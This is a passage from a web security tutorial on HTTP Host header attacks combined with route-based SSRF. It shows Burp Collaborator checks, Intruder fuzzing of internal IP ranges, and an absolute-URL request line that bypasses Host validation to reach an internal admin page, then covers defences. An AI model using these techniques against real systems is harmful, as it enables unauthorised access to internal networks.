<h3 id="54-host-header-attack--ssrf">5.4 Host header attack + SSRF</h3>
<p>Host header attack may lead to a route-based SSRF attack called: Host SSRF Attack.</p>
<p>Classic SSRF attacks are usually based on XXE or exploitable business logic that sends user-controllable URLs as HTTP requests; while route-based SSRF relies on cloud-deployed architectures that include load balancing and reverse proxies, these middleware assign requests to the corresponding back-end servers for processing, and if the server side does not verify requests forwarded by the Host header, the attacker may send (redirect) the request to any system in the system.</p>
<p>This may require knowing the IP address (private address) of the internal system, which can generally be determined by information gathering or Fuzz to determine a valid private IP address (e.g., enumerate 192.168.1.1/16).</p>
<h4 id="541-basic-host-header-attack--ssrf">5.4.1 Basic Host header attack + SSRF</h4>
<p>For example, the /admin page cannot be accessed in the normal way (404).</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/84ebfacf9a65464580116734e29b79ca.png" alt="sobyte"></p>
<p>Guess /admin exists in the intranet and requires an intranet machine to access it, but with Host header attack + SSRF it can be bypassed and accessed.</p>
<ul>
<li>The first step to determine whether the Host is being used, available DNSLog outbound</li>
</ul>
<p>Here I use Burp Collaborator client to implement the external banding.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/8f0b88e7dfd74b55bb39815945714b23.png" alt="sobyte"></p>
<p>It means that the server side is requesting resources based on the domain name of the Host header.</p>
<ul>
<li>The second step, based on the Host header SSRF probe intranet host</li>
</ul>
<p>If some sensitive pages (such as management pages), deep in the intranet, the external network can not be accessed, but through the Host header attack + SSRF can be achieved to bypass access control, so as to access the intranet assets, here Fuzz intranet IP of the C segment 192.168.0.0/24, the direct use of Intruder enumeration.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/6cc44d59e59a4d75950e55c3e3d9eb27.png" alt="sobyte"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/6f6a19d153d443c0a6ea1e6df1965238.png" alt="sobyte"></p>
<p>Get the intranet IP as 192.168.0.240</p>
<ul>
<li>Step 3, access the intranet resources</li>
</ul>
<p>Construct the /admin page and transpose the intranet IP at Host.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/e63f97064c4c4a9d9f07d5b13e764074.png" alt="sobyte"></p>
<h4 id="542-host-header-attack--ssrf---using-absolute-path-urls">5.4.2 Host header attack + SSRF - using absolute path URLs</h4>
<p>Sometimes the server will check the value of the Host header, and if the Host is modified, the server will reject all modified requests.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/78a10f1903984af0bada30fcecf0f6fd.png" alt="sobyte"></p>
<p>Ordinary requests usually use relative paths on the request domain, however, the server may also configure requests with absolute URLs at the same time, using the following form to bypass validation of the Host.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">GET http://acab1f4b1f3c7628805c2515009a00c9.web-security-academy.net/ HTTP/1.1
</code></pre></td></tr></table>
</div>
</div><p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/f790cfe2ea5a4c438cc0aa6eb9dba89c.png" alt="sobyte"></p>
<p>Then use the &ldquo;Burp Collaborator client&rdquo; to carry it out.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/572f85336ed346feb0c2ff9ae381faea.png" alt="sobyte"></p>
<p>The success of the extranet means that the Host header is used by the server to request resources from the specified domain name, directly SSRF blasting the intranet.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/e5b6079cf09144259893920dd6a86461.png" alt="sobyte"></p>
<p>Visit the intranet page.</p>
<p><img src="https://cdn.jsdelivr.net/gh/b0xt/sobyte-images/2022/03/02/6cbba82d65704b629a9885cf44af448a.png" alt="sobyte"></p>
<h2 id="6-http-host-header-attack-protection">6 HTTP Host header attack protection</h2>
<p>The easiest way to avoid using Host headers entirely in server-side code is to use only relative URLs.</p>
<p>Other methods include.</p>
<h3 id="61-properly-configuring-absolute-domain-urls">6.1 Properly configuring absolute domain URLs</h3>
<p>When absolute domain URLs must be used, the URL of the current domain should be manually specified in the configuration file and referenced to the configured value, rather than from the HTTP Host header. This method prevents cache poisoning for password resets.</p>
<h3 id="62-whitelist-checksum-host-header-for-domains">6.2 Whitelist checksum Host header for domains</h3>
<p>If the Host header must be used, it needs to be properly verified for legitimacy. This includes allowing the domain and verifying it using a whitelist, as well as denying or redirecting requests to unrecognizable hosts. This includes, but is not limited to, on individual web applications, load balancing, and reverse proxy devices.</p>
<h3 id="63-host-header-override-is-not-supported">6.3 Host header override is not supported</h3>
<p>Ensure that fields with similar functionality to the Host header, such as X-Forwarded-Host, X-Forwarded-For, etc., are not applied, as these are sometimes turned on by default.</p>
<p>It is worth mentioning that Host hosts used on the intranet (not out of the network) should not be hosted on the same server as applications on the public network, otherwise an attacker may be able to manipulate the Host header to access the internal domain.</p>

    </div>

    
<footer class="post-footer">
      
      <nav class="post-nav">
        <a class="prev" href="/post/2022-03/python-metaclass/">
            <i class="iconfont icon-left"></i>
            <span class="prev-text nav-default">Metaclass in Python 3</span>
            <span class="prev-text nav-mobile">Prev</span>
          </a>
        <a class="next" href="/post/2022-03/setup-ftp-server-with-vsftpd-on-ubuntu/">
            <span class="next-text nav-default">How to set up an ftp server on ubuntu 20.04 using vsftpd</span>
            <span class="next-text nav-mobile">Next</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
  </article>
        </div>
        

  

  

      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="social-links">
  <a href="https://www.sobyte.net/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
</div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
  </span>

  

  <span class="copyright-year">
    &copy; 
    2021 - 
    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span></span>
  </span>
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>



<script type="text/javascript" src="/js/main.min.c99b103c33d1539acf3025e1913697534542c4a5aa5af0ccc20475ed2863603b.js"></script>
  <script type="text/javascript">
    window.MathJax = {
      tex: {
        inlineMath: [['$','$'], ['\\(','\\)']],
        tags: 'ams',
        }
    };
  </script>
  <script async src="https://cdn.jsdelivr.net/npm/mathjax@3.0.5/es5/tex-mml-chtml.js" integrity="sha256-HGLuEfFcsUJGhvB8cQ8nr0gai9EucOOaIxFw7qxmd+w=" crossorigin="anonymous"></script>








</body>
</html>
